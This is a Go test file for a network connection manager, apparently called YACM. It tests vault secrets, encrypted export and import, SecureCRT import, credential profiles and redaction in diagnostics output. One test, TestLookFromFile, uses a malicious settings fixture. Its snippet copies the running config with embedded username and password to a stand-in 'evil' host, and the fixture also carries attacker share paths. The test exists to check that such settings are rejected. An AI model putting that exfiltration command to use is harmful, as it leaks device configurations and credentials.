// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 The YACM Authors. Additional terms under GPLv3 section 7: see NOTICE.md.

package core

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/yacm-app/yacm/internal/exchange"
	"github.com/yacm-app/yacm/internal/importer"
	"github.com/yacm-app/yacm/internal/store"
)

func sp(s string) *string { return &s }

func newTestApp(t *testing.T) *App {
	a, err := NewApp(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if err := a.CreateVault("test-master-pw"); err != nil {
		t.Fatal(err)
	}
	return a
}

func TestSaveNodeSecrets(t *testing.T) {
	a := newTestApp(t)
	n := store.Node{Name: "r1", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1",
		Jump:   []store.JumpHost{{Host: "j1", Auth: store.AuthPassword}, {Host: "j2", Auth: store.AuthPassword}},
		Expect: []store.ExpectRule{{ID: "r-a", Active: true, Expect: "Password:", Send: "leak?", Hidden: true}}}}
	saved, err := a.SaveNode(n, &SecretInput{Password: sp("pw"), Jump: map[string]*string{"0": sp("j1pw"), "1": sp("j2pw")}, Expect: map[string]*string{"r-a": sp("enable-pw")}})
	if err != nil {
		t.Fatal(err)
	}
	if saved.Session.Expect[0].Send != "" {
		t.Fatal("hidden send stored in plain config")
	}
	id := saved.ID
	if a.secret(store.SecretPassword(id)) != "pw" || a.secret(store.SecretExpect(id, "r-a")) != "enable-pw" {
		t.Fatal("secrets not stored")
	}
	// Remove first hop: second hop's password must move to index 0.
	saved.Session.Jump = saved.Session.Jump[1:]
	saved.Session.Expect = nil // rule removed: its secret must go
	if _, err := a.SaveNode(*saved, &SecretInput{JumpOrigin: []int{1}}); err != nil {
		t.Fatal(err)
	}
	if got := a.secret(store.SecretJumpPassword(id, 0)); got != "j2pw" {
		t.Fatalf("jump 0 = %q", got)
	}
	if a.vault.Has(store.SecretJumpPassword(id, 1)) || a.vault.Has(store.SecretExpect(id, "r-a")) {
		t.Fatal("stale secrets left in vault")
	}
	if a.secret(store.SecretPassword(id)) != "pw" {
		t.Fatal("unchanged password lost")
	}
	// Explicit empty string deletes.
	if _, err := a.SaveNode(*saved, &SecretInput{Password: sp("")}); err != nil {
		t.Fatal(err)
	}
	if a.vault.Has(store.SecretPassword(id)) {
		t.Fatal("password not deleted")
	}
	dup, err := a.DuplicateNode(id)
	if err != nil || a.secret(store.SecretJumpPassword(dup.ID, 0)) != "j2pw" {
		t.Fatalf("duplicate secrets: %v", err)
	}
	if err := a.DeleteNode(id); err != nil || a.vault.Has(store.SecretJumpPassword(id, 0)) {
		t.Fatal("delete did not purge secrets")
	}
}

func TestParseQuick(t *testing.T) {
	cases := map[string]string{
		"admin@10.0.0.1":                "ssh admin 10.0.0.1 22",
		"ssh://ivan@[2001:db8::1]:2222": "ssh ivan 2001:db8::1 2222",
		"telnet://10.1.1.1":             "telnet  10.1.1.1 23",
		"router.example.net":            "ssh  router.example.net 22",
	}
	for in, want := range cases {
		n, err := parseQuick(in)
		if err != nil {
			t.Fatalf("%s: %v", in, err)
		}
		s := n.Session
		got := string(s.Protocol) + " " + s.User + " " + s.Host + " " + strconv.Itoa(s.Port)
		if got != want {
			t.Errorf("%s: got %q want %q", in, got, want)
		}
	}
	n, err := parseQuick("serial://COM3?baud=115200")
	if err != nil || n.Session.Serial.Device != "COM3" || n.Session.Serial.Baud != 115200 {
		t.Fatalf("serial: %v %+v", err, n)
	}
	if _, err := parseQuick("not a host!"); err == nil {
		t.Fatal("garbage accepted")
	}
}

func TestExportImportRoundTrip(t *testing.T) {
	a := newTestApp(t)
	g, _ := a.SaveNode(store.Node{Name: "Core", IsGroup: true}, nil)
	n, err := a.SaveNode(store.Node{Name: "r1", ParentID: g.ID, Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1",
		Jump:   []store.JumpHost{{Host: "j1", Auth: store.AuthPassword}},
		Expect: []store.ExpectRule{{ID: "r-a", Active: true, Expect: "Password:", Hidden: true}}}},
		&SecretInput{Password: sp("pw"), Jump: map[string]*string{"0": sp("jpw")}, Expect: map[string]*string{"r-a": sp("en")}})
	if err != nil {
		t.Fatal(err)
	}
	path := t.TempDir() + "/backup.yacm"
	// Passwords leave only with the master password.
	if _, err := a.ExportSessions(path, exchange.ExportOptions{IncludeSecrets: true, Password: "export-pw-123", Master: "wrong"}); err == nil {
		t.Fatal("exported passwords without the master password")
	}
	sum, err := a.ExportSessions(path, exchange.ExportOptions{IncludeSecrets: true, Password: "export-pw-123", Master: "test-master-pw", IncludeSettings: true})
	if err != nil || sum.Sessions != 1 || sum.Groups != 1 || sum.Secrets != 3 {
		t.Fatalf("%v %+v", err, sum)
	}

	b := newTestApp(t)
	info, err := b.InspectImport(path)
	if err != nil || info.Kind != "yacm" || !info.Info.HasSecrets || info.Info.Existing != 0 {
		t.Fatalf("%v %+v", err, info)
	}
	rep, err := b.ImportSessions(path, exchange.ImportOptions{Target: "root", OnConflict: "copy", Password: "export-pw-123", ApplySettings: true})
	if err != nil || rep.Sessions != 1 || rep.Secrets != 3 || !rep.SettingsApplied {
		t.Fatalf("%v %+v", err, rep)
	}
	got, err := b.store.Get(n.ID)
	if err != nil || got.ParentID != g.ID {
		t.Fatalf("restored node: %v %+v", err, got)
	}
	if b.secret(store.SecretPassword(n.ID)) != "pw" || b.secret(store.SecretJumpPassword(n.ID, 0)) != "jpw" || b.secret(store.SecretExpect(n.ID, "r-a")) != "en" {
		t.Fatal("secrets not restored")
	}
	// Importing the same file again with "copy" duplicates instead of clashing.
	rep, err = b.ImportSessions(path, exchange.ImportOptions{Target: "group", OnConflict: "copy", Password: "export-pw-123"})
	if err != nil || rep.Sessions != 1 || len(b.store.List()) != 5 {
		t.Fatalf("second import: %v %+v %d", err, rep, len(b.store.List()))
	}
}

func TestForeignImportFlow(t *testing.T) {
	a := newTestApp(t)
	dir := "../internal/importer/testdata/foreign/securecrt-pass/Sessions"
	info, err := a.InspectImport(dir)
	if err != nil || info.Kind != "securecrt" || info.Foreign.Sessions != 2 || info.Foreign.SecretsFailed != 2 || info.Foreign.PasswordLabel == "" {
		t.Fatalf("inspect: %v %+v %+v", err, info, info.Foreign)
	}
	prev, err := a.PreviewForeign("securecrt", dir, "scrt-pass")
	if err != nil || prev.Foreign.SecretsFailed != 0 || prev.Foreign.Secrets != 2 {
		t.Fatalf("preview with passphrase: %v %+v", err, prev.Foreign)
	}
	if len(a.store.List()) != 0 {
		t.Fatal("preview stored something")
	}
	rep, err := a.ImportForeign(ForeignRequest{Kind: "securecrt", Path: dir, Password: "scrt-pass"})
	if err != nil || rep.Sessions != 2 || rep.Secrets != 2 {
		t.Fatalf("import: %v %+v", err, rep)
	}
	var p1 *store.Node
	for _, n := range a.store.List() {
		if n.Name == "P1" {
			p1 = n
		}
	}
	if p1 == nil || a.secret(store.SecretPassword(p1.ID)) != "pw-two" {
		t.Fatal("password not in vault")
	}
	// .yacm detection still works through the same entry point.
	if _, err := a.InspectImport("../internal/importer/testdata/foreign/mobaxterm.mxtsessions"); err != nil {
		t.Fatal(err)
	}
}

func TestStampLines(t *testing.T) {
	now := time.Date(2026, 10, 22, 13, 5, 9, 0, time.UTC)
	out, mid := stampLines([]byte("R1#show ver\r\nCisco IOS\r\nR1#"), false, now)
	want := "[2026-10-22 13:05:09] R1#show ver\r\n[2026-10-22 13:05:09] Cisco IOS\r\n[2026-10-22 13:05:09] R1#"
	if string(out) != want || !mid {
		t.Fatalf("got %q mid=%v", out, mid)
	}
	// A chunk that continues the same line gets no new stamp.
	out, mid = stampLines([]byte("show clock\r\n"), mid, now)
	if string(out) != "show clock\r\n" || mid {
		t.Fatalf("continuation: %q mid=%v", out, mid)
	}
	// Empty lines stay empty.
	out, _ = stampLines([]byte("\r\n\r\nx"), false, now)
	if string(out) != "\r\n\r\n[2026-10-22 13:05:09] x" {
		t.Fatalf("empty lines: %q", out)
	}
}

func TestCredentialProfileFlow(t *testing.T) {
	a := newTestApp(t)
	c, err := a.SaveCredential(store.Credential{Name: "AD account", User: "ivan"}, &CredentialSecrets{Password: sp("old-pass")})
	if err != nil {
		t.Fatal(err)
	}
	g, err := a.SaveNode(store.Node{Name: "DC", IsGroup: true, Defaults: &store.GroupDefaults{CredentialID: c.ID}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	n, err := a.SaveNode(store.Node{Name: "sw1", ParentID: g.ID, Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", CredentialID: store.Inherit}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	tb := &tab{node: n}
	tb.eff, _ = a.store.Effective(n)
	if got := a.resolveTokens(tb, "<USER>/<PASS>"); got != "ivan/old-pass" {
		t.Fatalf("tokens = %q", got)
	}
	// Changing the password in the profile changes it for every session.
	if _, err := a.SaveCredential(*c, &CredentialSecrets{Password: sp("new-pass")}); err != nil {
		t.Fatal(err)
	}
	if got := a.resolveTokens(tb, "<PASS>"); got != "new-pass" {
		t.Fatalf("after change = %q", got)
	}
	st := a.GetState()
	if len(st.Credentials) != 1 || !st.Credentials[0].HasPassword || st.Credentials[0].Groups != 1 {
		t.Fatalf("state = %+v", st.Credentials)
	}
	// Bulk: give the session its own password and login.
	if _, err := a.BulkUpdate(BulkRequest{IDs: []string{g.ID}, Change: store.BulkChange{CredentialID: sp(""), User: sp("local")}, Password: sp("own-pass")}); err != nil {
		t.Fatal(err)
	}
	n2, _ := a.store.Get(n.ID)
	tb = &tab{node: n2}
	tb.eff, _ = a.store.Effective(n2)
	if got := a.resolveTokens(tb, "<USER>/<PASS>"); got != "local/own-pass" {
		t.Fatalf("after bulk = %q", got)
	}
	if err := a.DeleteCredential(c.ID); err != nil {
		t.Fatal(err)
	}
	if a.vault.Has(store.SecretCredPassword(c.ID)) {
		t.Fatal("profile password must be removed with the profile")
	}
}

// A large SecureCRT import reports progress while the passwords are
// decrypted, the import reuses the preview, and Cancel stops it.
func TestForeignImportProgressAndCache(t *testing.T) {
	a := newTestApp(t)
	var mu sync.Mutex
	var events []ImportProgress
	a.emitter = func(name string, data any) {
		if name == "import:progress" {
			mu.Lock()
			events = append(events, data.(ImportProgress))
			mu.Unlock()
		}
	}
	dir := "../internal/importer/testdata/foreign/securecrt-many/Sessions"
	info, err := a.InspectImport(dir)
	if err != nil || info.Foreign.Sessions != 24 || info.Foreign.Secrets != 24 {
		t.Fatalf("preview: %v %+v", err, info)
	}
	mu.Lock()
	n := len(events)
	last := events[len(events)-1]
	mu.Unlock()
	if n < 2 || last.Done != 24 || last.Total != 24 {
		t.Fatalf("progress events %d, last %+v", n, last)
	}
	start := time.Now()
	rep, err := a.ImportForeign(ForeignRequest{Kind: "securecrt", Path: dir, GroupName: "Branches"})
	if err != nil || rep.Sessions != 24 || rep.Secrets != 24 {
		t.Fatalf("import: %v %+v", err, rep)
	}
	if d := time.Since(start); d > time.Second {
		t.Fatalf("import decrypted again (%v)", d)
	}
	var group *store.Node
	byName := map[string]*store.Node{}
	for _, n := range a.store.List() {
		byName[n.Name] = n
		if n.Name == "Branches" {
			group = n
		}
	}
	if group == nil || byName["Branch"] == nil || byName["Branch"].ParentID != group.ID || byName["br-sw07"].ParentID != byName["Branch"].ID {
		t.Fatalf("tree not under the new group: %+v", byName["Branch"])
	}
	if a.secret(store.SecretPassword(byName["br-sw07"].ID)) != "branch-pw-07" {
		t.Fatal("password missing")
	}

	// The cached preview is used once; a cancelled run reports it.
	go func() {
		for i := 0; i < 200 && !a.importStop.Load(); i++ {
			mu.Lock()
			started := len(events) > n
			mu.Unlock()
			if started {
				a.CancelImport()
				return
			}
			time.Sleep(5 * time.Millisecond)
		}
	}()
	if _, err := a.PreviewForeign("securecrt", dir, ""); !errors.Is(err, importer.ErrCancelled) {
		t.Fatalf("cancel: %v", err)
	}
}

func TestDiagnosticsHasNoSecrets(t *testing.T) {
	a := newTestApp(t)
	n := store.Node{Name: "r1", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.9.9.9", User: "admin", Auth: store.AuthPassword}}
	if _, err := a.SaveNode(n, &SecretInput{Password: sp("Very-Secret-1")}); err != nil {
		t.Fatal(err)
	}
	d := a.Diagnostics("test-agent")
	for _, bad := range []string{"Very-Secret-1", "test-master-pw"} {
		if strings.Contains(d, bad) {
			t.Fatalf("diagnostics contain %q:\n%s", bad, d)
		}
	}
	if !strings.Contains(d, "YACM "+appVersion) || !strings.Contains(d, "Sessions 1, groups 0") || !strings.Contains(d, "test-agent") {
		t.Fatalf("diagnostics:\n%s", d)
	}
}

// Settings from someone else's file bring the look, never security settings.
func TestLookFromFile(t *testing.T) {
	mine := store.DefaultSettings()
	mine.NetBoxURL = "https://netbox.example.net"
	file := store.Settings{Theme: "light", FontSize: 18, AutoLockMinutes: 0, LogSecretsInClear: true, NetBoxURL: "https://evil.example",
		DefaultLogDir: `\\evil\share`, TeamLibraries: []store.TeamLibraryRef{{ID: "x", Path: `\\evil\lib.json`}}, UseSystemKnownHost: false,
		Snippets: []store.Snippet{{ID: "s", Text: "copy run scp://<USER>:<PASS>@evil/x"}}}
	got := lookFrom(mine, file)
	if got.Theme != "light" || got.FontSize != 18 {
		t.Fatalf("look not taken: %+v", got)
	}
	if got.AutoLockMinutes != mine.AutoLockMinutes || got.LogSecretsInClear || got.NetBoxURL != mine.NetBoxURL || got.DefaultLogDir != mine.DefaultLogDir ||
		len(got.TeamLibraries) != 0 || got.UseSystemKnownHost != mine.UseSystemKnownHost || len(got.Snippets) != len(mine.Snippets) {
		t.Fatalf("security settings or commands taken from the file: %+v", got)
	}
}

// SecureCRT credential sets become credential profiles with their password
// in the vault; importing again uses the same profile, and a profile of the
// same name with another login is added under another name.
func TestImportSecureCRTCredentialSets(t *testing.T) {
	a := newTestApp(t)
	root := t.TempDir()
	// "xml-pw", encrypted the "02:" way without a passphrase.
	const pw = "02:cf6fd9633a9e5a055cd863dcb6a322c7ed32c8bb926618581a25e4d2bcfa1e70851f790b1ffffcd218e07791612230b51dcab99aceacd3f01647b11656fa40a8"
	files := map[string]string{
		"Credentials/A1-admin.ini": "S:\"Username\"=admin\nS:\"Password V2\"=" + pw + "\n",
		"Credentials/lab.ini":      "S:\"Username\"=labuser\n",
		"Sessions/APIC1.ini":       "S:\"Protocol Name\"=SSH2\nS:\"Hostname\"=10.12.0.36\nS:\"Username\"=old\nS:\"Credential Title\"=A1-admin\n",
		"Sessions/S2.ini":          "S:\"Protocol Name\"=SSH2\nS:\"Hostname\"=10.12.0.37\nS:\"Credential Title\"=lab\n",
	}
	for f, text := range files {
		p := filepath.Join(root, "Config", filepath.FromSlash(f))
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(text), 0o600)
	}
	if _, err := a.store.UpsertCredential(&store.Credential{Name: "LAB", User: "someone-else"}); err != nil {
		t.Fatal(err)
	}
	prev, err := a.PreviewForeign("securecrt", root, "")
	if err != nil || prev.Foreign.Profiles != 2 {
		t.Fatalf("preview: %v %+v", err, prev)
	}
	rep, err := a.ImportForeign(ForeignRequest{Kind: "securecrt", Path: root})
	if err != nil || rep.Sessions != 2 || rep.Profiles != 2 || rep.ProfilesKept != 0 || rep.Secrets != 1 {
		t.Fatalf("import: %v %+v", err, rep)
	}
	byName := map[string]*store.Credential{}
	for _, c := range a.store.Credentials() {
		byName[c.Name] = c
	}
	a1 := byName["A1-admin"]
	if a1 == nil || a.secret(store.SecretCredPassword(a1.ID)) != "xml-pw" || byName["lab (imported)"] == nil || byName["LAB"].User != "someone-else" {
		t.Fatalf("profiles %+v", byName)
	}
	find := func(name string) []*store.Node {
		var out []*store.Node
		for _, n := range a.store.List() {
			if n.Name == name {
				out = append(out, n)
			}
		}
		return out
	}
	e, err := a.store.Effective(find("APIC1")[0])
	if err != nil || e.User != "admin" || e.CredentialID != a1.ID {
		t.Fatalf("effective %+v %v", e, err)
	}

	// The same import again adds no profiles.
	rep, err = a.ImportForeign(ForeignRequest{Kind: "securecrt", Path: root})
	if err != nil || rep.Profiles != 0 || rep.ProfilesKept != 2 || rep.Secrets != 0 {
		t.Fatalf("second import: %v %+v", err, rep)
	}
	if got := len(a.store.Credentials()); got != 3 {
		t.Fatalf("%d profiles after the second import", got)
	}
	for _, n := range find("APIC1") {
		if n.Session.CredentialID != a1.ID {
			t.Fatalf("second APIC1 uses %s", n.Session.CredentialID)
		}
	}
}

// The profile list the UI gets says which profiles are used and have a
// password (the embedded store.Credential has its own MarshalJSON).
func TestCredentialInfoJSON(t *testing.T) {
	a := newTestApp(t)
	c, err := a.SaveCredential(store.Credential{Name: "AD", User: "u1"}, &CredentialSecrets{Password: sp("pw")})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := a.store.Upsert(&store.Node{Name: "r1", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", CredentialID: c.ID}}); err != nil {
		t.Fatal(err)
	}
	b, err := json.Marshal(a.GetState().Credentials)
	if err != nil {
		t.Fatal(err)
	}
	var got []map[string]any
	json.Unmarshal(b, &got)
	if len(got) != 1 || got[0]["name"] != "AD" || got[0]["user"] != "u1" || got[0]["hasPassword"] != true || got[0]["sessions"] != float64(1) {
		t.Fatalf("%s", b)
	}
}
